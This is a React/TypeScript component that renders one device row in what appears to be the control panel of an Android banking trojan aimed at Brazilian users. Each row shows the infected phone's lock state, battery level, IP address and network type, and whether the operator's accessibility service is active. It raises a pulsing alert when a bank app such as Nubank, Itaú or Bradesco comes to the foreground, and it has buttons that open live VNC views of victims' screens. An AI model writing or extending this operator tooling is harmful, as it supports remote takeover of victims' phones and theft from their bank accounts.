import { memo, type MouseEvent } from 'react';
import type { Cliente } from '@/types/dashboard';
import LatencyBadge from './LatencyBadge';
import { Lock, Unlock, Eye, Trash2, Smartphone, Zap, Activity, Radio, ChevronRight, Battery, BatteryCharging, Globe, ShieldCheck, ShieldAlert, Wifi, Signal } from 'lucide-react';
import { useTranslation } from '../../utils/i18n';

interface DeviceRowProps {
  cliente: Cliente;
  onClick: () => void;
  onContextMenu: (event: MouseEvent) => void;
  onDeleteDevice?: (cliente: Cliente) => void;
  onOpenVnc?: (cliente: Cliente) => void;
}

function getNetworkBadge(netType?: string | null) {
  if (!netType) return { name: 'Wi-Fi', isWifi: true, is4g: false };
  const n = netType.toLowerCase();
  if (n.includes('wifi') || n.includes('wi-fi') || n.includes('wlan')) {
    return { name: 'Wi-Fi', isWifi: true, is4g: false };
  }
  if (n.includes('5g')) {
    return { name: '5G', isWifi: false, is4g: true };
  }
  if (n.includes('4g') || n.includes('lte') || n.includes('cellular') || n.includes('mobile')) {
    return { name: '4G', isWifi: false, is4g: true };
  }
  if (n.includes('3g') || n.includes('2g')) {
    return { name: '3G', isWifi: false, is4g: true };
  }
  return { name: 'Wi-Fi', isWifi: true, is4g: false };
}

function getBrandBadge(pkg?: string) {
  if (!pkg) return null;
  const p = pkg.toLowerCase();
  if (p.includes('nubank') || p.includes('nu.production')) return { name: 'NUBANK', color: 'bg-[#84cc16]/30 text-[#fca5a5] border-[#f87171]/40' };
  if (p.includes('bradesco')) return { name: 'BRADESCO', color: 'bg-[#ef4444]/30 text-[#ef4444] border-[#2a2a31]/40' };
  if (p.includes('itau')) return { name: 'ITAÚ', color: 'bg-[#84cc16]/30 text-[#fca5a5] border-[#ef4444]/40' };
  if (p.includes('santander')) return { name: 'SANTANDER', color: 'bg-[#ef4444]/30 text-[#e8e8ea] border-[#3a3a44]/40' };
  if (p.includes('inter')) return { name: 'INTER', color: 'bg-[#ef4444]/30 text-orange-200 border-[#f87171]/40' };
  if (p.includes('caixa')) return { name: 'CAIXA', color: 'bg-[#ef4444]/30 text-[#ef4444] border-[#2a2a31]/40' };
  if (p.includes('c6')) return { name: 'C6 BANK', color: 'bg-[#242424] text-amber-300 border-amber-500/40' };
  if (p.includes('pagseguro') || p.includes('pagbank')) return { name: 'PAGBANK', color: 'bg-emerald-600/30 text-emerald-300 border-emerald-500/40' };
  if (p.includes('mercadopago')) return { name: 'MERCADO PAGO', color: 'bg-[#ef4444]/30 text-[#ef4444] border-[#2a2a31]/40' };
  if (p.includes('picpay')) return { name: 'PICPAY', color: 'bg-emerald-500/30 text-emerald-200 border-emerald-400/40' };
  return { name: 'BANCO DETECTADO', color: 'bg-[#ef4444]/30 text-[#ef4444] border-[#2a2a31]/50' };
}

function getBrandLogo(modelName: string) {
  const m = modelName.toLowerCase();
  if (m.includes('samsung')) return { label: 'SAMSUNG', color: 'bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]' };
  if (m.includes('motorola') || m.includes('moto')) return { label: 'MOTOROLA', color: 'bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]' };
  if (m.includes('xiaomi') || m.includes('redmi') || m.includes('poco')) return { label: 'XIAOMI', color: 'bg-orange-950/90 text-[#fca5a5] border-[#ef4444]/50 shadow-[0_0_8px_rgba(245,158,11,0.3)]' };
  if (m.includes('windows') || m.includes('pc')) return { label: 'WINDOWS PC', color: 'bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(190,242,100,0.3)]' };
  if (m.includes('apple') || m.includes('iphone')) return { label: 'IPHONE', color: 'bg-[#24242a]/90 text-slate-200 border-slate-400/50 shadow-[0_0_8px_rgba(225,213,203,0.3)]' };
  return { label: 'ANDROID', color: 'bg-[#121214]/90 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]' };
}

function DeviceRow({ cliente, onClick, onContextMenu, onDeleteDevice, onOpenVnc }: DeviceRowProps) {
  const { t } = useTranslation();
  const isOnline = cliente.status === 'online';
  const bankInfo = cliente.activeBank ? getBrandBadge(cliente.activeBank.package) : null;
  const brandBadge = getBrandLogo(cliente.modelName);
  const isWindows = cliente.modelName.toLowerCase().includes('windows') || cliente.modelName.toLowerCase().includes('pc:');

  const hasBattery = typeof cliente.batteryLevel === 'number' && !isNaN(cliente.batteryLevel);
  const batteryVal = hasBattery ? cliente.batteryLevel! : 100;
  const isCharging = !!cliente.isCharging;

  let batteryBgClass = 'bg-[#121214]/80 text-[#ef4444] border-[#3a3a44]/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]';
  if (isCharging) {
    batteryBgClass = 'bg-amber-950/90 text-amber-300 border-amber-400/70 shadow-[0_0_15px_rgba(245,158,11,0.4)] animate-pulse';
  } else if (!hasBattery) {
    batteryBgClass = 'bg-[#121214]/80 text-[#ef4444] border-[#3a3a44]/50 shadow-[0_0_10px_rgba(239,68,68,0.2)]';
  } else if (batteryVal > 50) {
    batteryBgClass = 'bg-[#121214]/90 text-[#ef4444] border-[#3a3a44]/60 shadow-[0_0_14px_rgba(239,68,68,0.35)]';
  } else if (batteryVal > 20) {
    batteryBgClass = 'bg-amber-950/90 text-amber-300 border-amber-400/60 shadow-[0_0_14px_rgba(245,158,11,0.35)]';
  } else {
    batteryBgClass = 'bg-[#121214]/90 text-[#ef4444] border-[#3a3a44]/70 shadow-[0_0_18px_rgba(239,68,68,0.5)] animate-pulse';
  }

  return (
    <tr
      onClick={onClick}
      onContextMenu={onContextMenu}
      className={`group cursor-pointer transition-all duration-300 relative bg-gradient-to-r from-[#121214]/90 via-[#1a1a1e]/85 to-[#0a0a0b]/90 shadow-[0_8px_30px_rgba(0,0,0,0.65)] hover:shadow-[0_0_35px_rgba(239,68,68,0.35)] hover:scale-[1.006] ${
        isOnline
          ? 'hover:from-[#1a1a1e]/95 hover:to-[#121214]/95'
          : 'opacity-60 hover:opacity-95'
      }`}
    >
      {/* 1. STATUS & LATÊNCIA COM FAIXA LATERAL E GLOW ANIMADO */}
      <td className="px-4 py-3.5 whitespace-nowrap first:rounded-l-2xl border-y border-l border-[#2a2a31]/30 group-hover:border-[#4a4a56]">
        <div className="flex items-center gap-3">
          {/* Faixa vertical de status */}
          <div className={`w-1.5 h-10 rounded-full transition-all ${
            isOnline 
              ? 'bg-gradient-to-b from-[#f87171] to-[#ef4444] shadow-[0_0_12px_rgba(239,68,68,0.9)]' 
              : 'bg-[#2a2a31]'
          }`}></div>

          <div className="relative flex items-center justify-center">
            {isOnline ? (
              <>
                <span className="absolute w-5 h-5 rounded-full bg-[#ef4444]/50 animate-ping" />
                <span className="w-3.5 h-3.5 rounded-full bg-gradient-to-tr from-[#f87171] to-[#f87171] shadow-[0_0_15px_rgba(239,68,68,1)] relative z-10" />
              </>
            ) : (
              <span className="w-3 h-3 rounded-full bg-[#6f6f78] border border-[#8b8b94] relative z-10" />
            )}
          </div>
          <LatencyBadge lastActivityAt={cliente.lastActivityAt} isOnline={isOnline} />
        </div>
      </td>

      {/* 2. APARELHO / MODELO + BADGE DA MARCA & BATERIA */}
      <td className="px-4 py-3.5 whitespace-nowrap border-y border-[#2a2a31]/30 group-hover:border-[#4a4a56]">
        <div className="flex items-center gap-3.5">
          <div className={`p-3 rounded-md border transition-all ${
            isOnline 
              ? 'bg-gradient-to-br from-[#121214]/90 to-[#121214]/90 border-[#2a2a31]/50 text-[#ef4444] group-hover:border-[#4a4a56] group-hover:shadow-[0_0_20px_rgba(239,68,68,0.4)]' 
              : 'bg-[#121214]/90 border-[#24242a] text-[#8b8b94]'
          }`}>
            {isWindows ? <Radio className="w-5 h-5 text-[#ef4444]" /> : <Smartphone className="w-5 h-5 text-[#ef4444]" />}
          </div>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              {/* Badge da Marca */}
              <span className={`px-2 py-0.5 text-[9px] font-black font-mono uppercase rounded-md border ${brandBadge.color}`}>
                {brandBadge.label}
              </span>

              <span className="text-white font-black text-sm tracking-wide block font-mono group-hover:text-[#e8e8ea] transition-colors">
                {cliente.modelName}
              </span>

              {/*  Nível de Bateria */}
              <span 
                className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-md text-xs font-black border font-mono transition-transform hover:scale-105 ${batteryBgClass}`} 
                title={hasBattery ? `Bateria: ${batteryVal}% ${isCharging ? '(Carregando )' : ''}` : 'Bateria em sincronia'}
              >
                {isCharging ? (
                  <BatteryCharging className="w-4 h-4 text-amber-300 animate-pulse" />
                ) : (
                  <Battery className="w-4 h-4" />
                )}
                <span>{hasBattery ? `${batteryVal}%` : ' ON'}</span>
              </span>
            </div>
            <div className="flex items-center gap-2 text-[11px] text-[#ef4444]/60 font-mono mt-1 flex-wrap">
              <span className="bg-[#121214]/80 px-2 py-0.5 rounded border border-[#24242a]/80">ID: {cliente.deviceId.substring(0, 14)}...</span>
            </div>
          </div>
        </div>
      </td>

      {/* 3. ATIVIDADE / APP EM FOCO (DESTAQUE PARA BANCOS & TELA) */}
      <td className="px-4 py-3.5 whitespace-nowrap border-y border-[#2a2a31]/30 group-hover:border-[#4a4a56]">
        {isOnline ? (
          <div className="flex items-center gap-2.5">
            {/* Indicador de Bloqueio/Tela */}
            {cliente.isLocked ? (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-md text-xs font-black uppercase tracking-wider bg-[#121214]/80 text-[#ef4444] border border-[#2a2a31]/50 shadow-[0_0_12px_rgba(239,68,68,0.4)] font-mono">
                <Lock className="w-3.5 h-3.5 text-[#ef4444] animate-pulse" />
                {t('row.locked')}
              </span>
            ) : (
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-md text-xs font-black uppercase tracking-wider bg-[#121214]/80 text-[#ef4444] border border-[#2a2a31]/50 shadow-[0_0_12px_rgba(239,68,68,0.35)] font-mono">
                <Unlock className="w-3.5 h-3.5 text-[#ef4444]" />
                {t('row.free')}
              </span>
            )}

            {/* App Bancário Ativo (Alerta Neon Pulsante) */}
            {bankInfo ? (
              <span className={`px-3 py-1 text-xs font-black uppercase rounded-md border animate-pulse shadow-lg inline-flex items-center gap-2 font-mono ${bankInfo.color}`}>
                <span className="w-2.5 h-2.5 rounded-full bg-white animate-ping"></span>
                 {bankInfo.name} IN FOCUS
              </span>
            ) : cliente.foregroundApp ? (
              <span className="inline-flex items-center gap-2 px-3 py-1 rounded-md text-xs font-bold bg-[#121214]/70 text-[#e8e8ea] border border-[#2a2a31]/40 shadow-[0_0_10px_rgba(239,68,68,0.2)] font-mono">
                <Eye className="w-4 h-4 text-[#ef4444]" />
                {cliente.foregroundApp}
              </span>
            ) : (
              <span className="text-[#ef4444]/50 text-xs italic font-mono flex items-center gap-1.5">
                <Activity className="w-3.5 h-3.5 text-[#ef4444]/50" />
                {t('row.waiting_focus')}
              </span>
            )}
          </div>
        ) : (
          <span className="text-[#6f6f78] text-xs italic font-mono">{t('row.inactive')}</span>
        )}
      </td>

      {/* 4. IP DE ORIGEM & REDE (WI-FI / 4G) */}
      <td className="px-4 py-3.5 whitespace-nowrap border-y border-[#2a2a31]/30 group-hover:border-[#4a4a56]">
        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 text-xs font-black font-mono text-[#ef4444] bg-[#121214]/80 border border-[#2a2a31]/40 px-2.5 py-1 rounded-md shadow-[0_0_8px_rgba(239,68,68,0.2)]">
            <Globe className="w-3.5 h-3.5 text-[#ef4444]" />
            🇧🇷 BR
          </span>
          <span className="text-[#e8e8ea] font-mono text-xs font-black px-3 py-1 rounded-md bg-[#0a0a0b] border border-[#2a2a31]/40 shadow-[0_0_12px_rgba(239,68,68,0.2)]">
            {cliente.ip || '192.168.1.10'}
          </span>

          {/*  Indicador de Conexão */}
          {(() => {
            const net = getNetworkBadge(cliente.networkType);
            return (
              <span 
                className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md text-xs font-black font-mono border ${
                  net.isWifi 
                    ? 'bg-[#121214]/90 text-[#e8e8ea] border-[#3a3a44]/70 shadow-[0_0_10px_rgba(190,242,100,0.35)]' 
                    : 'bg-[#121214]/90 text-[#e8e8ea] border-[#3a3a44]/70 shadow-[0_0_10px_rgba(239,68,68,0.35)]'
                }`}
                title={`Conexão do Aparelho: ${net.name}`}
              >
                {net.isWifi ? <Wifi className="w-3.5 h-3.5 text-[#ef4444]" /> : <Signal className="w-3.5 h-3.5 text-[#ef4444]" />}
                <span>{net.name}</span>
              </span>
            );
          })()}
        </div>
      </td>

      {/* 5. SISTEMA OPERACIONAL & ACESSIBILIDADE DO NOSSO APP */}
      <td className="px-4 py-3.5 whitespace-nowrap border-y border-[#2a2a31]/30 group-hover:border-[#4a4a56]">
        <div className="flex items-center gap-2.5">
          <span className="inline-flex items-center gap-1.5 bg-[#121214]/60 border border-[#2a2a31]/40 rounded-md px-3 py-1 text-xs text-[#e8e8ea] font-bold font-mono shadow-[0_0_8px_rgba(239,68,68,0.2)]">
            <Zap className="w-4 h-4 text-[#ef4444] animate-pulse" />
            {cliente.androidVersion || 'Android'}
          </span>

          {/* Status de Acessibilidade */}
          {cliente.accessibilityActive ? (
            <span className="inline-flex items-center gap-1.5 bg-[#121214]/90 border border-[#3a3a44]/60 text-[#e8e8ea] font-black font-mono text-xs px-3 py-1 rounded-md shadow-[0_0_15px_rgba(239,68,68,0.4)]">
              <ShieldCheck className="w-4 h-4 text-[#ef4444] animate-pulse" />
              <span>ACCESIBLE</span>
            </span>
          ) : (
            <span className="inline-flex items-center gap-1.5 bg-[#121214] border border-[#24242a] text-[#8b8b94] font-bold font-mono text-xs px-3 py-1 rounded-md">
              <ShieldAlert className="w-4 h-4 text-[#8b8b94]" />
              <span>SIN ACCESO</span>
            </span>
          )}
        </div>
      </td>

      {/* 6. RECURSOS / STATUS & BOTÃO DE AÇÃO */}
      <td className="px-4 py-3.5 whitespace-nowrap text-right last:rounded-r-2xl border-y border-r border-[#2a2a31]/30 group-hover:border-[#4a4a56]">
        <div className="flex items-center justify-end gap-2.5">
          <div className="flex flex-wrap gap-1.5 items-center">
            {cliente.badges.map((badge) => {
              const isVncBadge = badge.toUpperCase() === 'VNC';
              return (
                <button
                  key={badge}
                  type="button"
                  onClick={(e) => {
                    if (onOpenVnc) {
                      e.stopPropagation();
                      onOpenVnc(cliente);
                    }
                  }}
                  className={`px-2.5 py-1 rounded-md border text-xs font-black uppercase font-mono transition-all ${
                    isVncBadge
                      ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] border-[#3a3a44] shadow-[0_0_12px_rgba(239,68,68,0.4)] cursor-pointer active:scale-95'
                      : 'bg-[#121214]/70 text-[#ef4444] border-[#2a2a31]/50 shadow-sm'
                  }`}
                  title={isVncBadge ? "Abrir Transmissão VNC Direta" : undefined}
                >
                  {badge}
                </button>
              );
            })}

            {onOpenVnc && (
              <button
                type="button"
                onClick={(e) => {
                  e.stopPropagation();
                  onOpenVnc(cliente);
                }}
                className="px-3.5 py-1.5 bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] hover:from-[#f87171] hover:to-[#ef4444] text-[#10120a] text-xs font-black font-mono uppercase tracking-wider rounded-md border border-[#4a4a56]/60 shadow-[0_0_18px_rgba(239,68,68,0.5)] transition-all transform hover:scale-105 active:scale-95 flex items-center gap-1.5 cursor-pointer"
                title="Abrir VNC Ao Vivo na Tela Sem Entrar no Cliente"
              >
                <span> {t('row.view_vnc')}</span>
              </button>
            )}
          </div>

          <div className="p-2 rounded-md bg-[#121214]/80 border border-[#2a2a31]/40 text-[#ef4444] group-hover:bg-gradient-to-r group-hover:from-[#ef4444] group-hover:to-[#ef4444] group-hover:text-[#10120a] group-hover:border-[#4a4a56] transition-all shadow-md group-hover:shadow-[0_0_15px_rgba(239,68,68,0.5)]">
            <ChevronRight className="w-4.5 h-4.5 group-hover:translate-x-0.5 transition-transform" />
          </div>

          {!isOnline && onDeleteDevice && (
            <button
              type="button"
              onClick={(e) => {
                e.stopPropagation();
                onDeleteDevice(cliente);
              }}
              className="p-1.5 text-[#8b8b94] hover:text-[#ef4444] hover:bg-[#121214]/60 rounded-md border border-transparent hover:border-[#2a2a31]/40 transition-all cursor-pointer"
              title="Excluir dispositivo offline"
            >
              <Trash2 className="w-4 h-4" />
            </button>
          )}
        </div>
      </td>
    </tr>
  );
}

function rowPropsEqual(prev: DeviceRowProps, next: DeviceRowProps): boolean {
  const a = prev.cliente;
  const b = next.cliente;
  return (
    a.deviceId === b.deviceId &&
    a.status === b.status &&
    a.ip === b.ip &&
    a.modelName === b.modelName &&
    a.androidVersion === b.androidVersion &&
    a.lastActivityAt === b.lastActivityAt &&
    a.isLocked === b.isLocked &&
    a.isScreenOn === b.isScreenOn &&
    a.foregroundApp === b.foregroundApp &&
    a.foregroundPackage === b.foregroundPackage &&
    a.batteryLevel === b.batteryLevel &&
    a.isCharging === b.isCharging &&
    a.accessibilityActive === b.accessibilityActive &&
    a.country === b.country &&
    a.activeBank?.package === b.activeBank?.package &&
    Math.round(a.latencyMs / 1000) === Math.round(b.latencyMs / 1000) &&
    a.badges.join(',') === b.badges.join(',')
  );
}

export default memo(DeviceRow, rowPropsEqual);
